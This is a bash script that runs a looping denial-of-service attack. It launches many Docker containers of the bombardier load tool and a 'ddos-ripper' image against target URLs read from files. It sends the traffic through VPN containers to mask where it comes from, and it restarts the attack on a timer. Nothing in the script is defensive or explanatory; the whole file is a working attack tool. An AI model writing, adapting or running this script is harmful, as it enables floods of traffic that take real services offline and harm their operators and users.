#!/bin/bash
RESOURCES_FILE_BOMB=$1
INSTANCE_PER_BOMB=$2
RESOURCES_FILE_RIPPER=$3
INSTANCE_PER_RIPPER=$4
TTL=$5


LOOP_COUNT=1
STEPS=$(expr $TTL / 30)
NUM_VPN=4
CUR=1
echo "$STEPS"


echo "Bombardier file: $RESOURCES_FILE_BOMB with $INSTANCE_PER_BOMB instances per url"
echo "Ripper file: $RESOURCES_FILE_RIPPER with $INSTANCE_PER_RIPPER instances per url"
echo "Restarting instances every $TTL seconds"


while true
do
   echo "Starting loop $LOOP_COUNT..."


   echo "Killing all running docker instances..."
   sudo docker rm -f $(sudo docker ps -aq --filter ancestor=alpine/bombardier) >/dev/null 2>&1 || true
   for i in {0..4} ; do
       echo -n '['
       for ((j=0; j<i; j++)) ; do echo -n '#'; done
       echo -n ''
       for ((j=i; j<5; j++)) ; do echo -n ' '; done
       echo -n "] $i / 5s" $'\r'
       sleep 1
   done
   echo "Killed all instances."


   echo "Starting Bombardier instances..."
   IFS=$'\n' read -d '' -r -a linesbomb < $RESOURCES_FILE_BOMB
   for BOMB in "${linesbomb[@]}"
   do
      if [ $CUR -gt $NUM_VPN ]
      then
         CUR=1
      fi
      TAR_VPN="app"$CUR"_vpn_1"
      echo "Starting for $BOMB. using VPN: $TAR_VPN"

      for (( c=1; c<=$INSTANCE_PER_BOMB; c++ ))
      do
         {
            sudo docker run -d -m 128m --cpus=2 --rm --net=container:$TAR_VPN alpine/bombardier -c 1000 -d 540s -l $BOMB
         } &> /dev/null
      done
      CUR=$(expr $CUR + 1)
   done
   echo "Bombardier instances started."


   echo "Starting Ripper instances..."
   IFS=$'\n' read -d '' -r -a linesripper < $RESOURCES_FILE_RIPPER
   for RIP in "${linesripper[@]}"
   do
      echo "Starting for $RIP."
      for (( c=1; c<=$INSTANCE_PER_RIPPER; c++ ))
      do
         {
            sudo docker run -d -m 256m --cpus=2 --rm --net=container:ddos_vpn_1 nitupkcuf/ddos-ripper $RIP
         } &> /dev/null
      done
   done
   echo "Ripper instances started."


   echo "Waiting for $TTL seconds."
   for i in {1..29} ; do
       echo -n '['
       for ((j=0; j<i; j++)) ; do echo -n '#'; done
       echo -n ''
       for ((j=i; j<30; j++)) ; do echo -n ' '; done
       echo -n "] $(expr $STEPS \* $i) / $TTL s" $'\r'
       sleep $STEPS
   done
   echo "Loop ended."
done
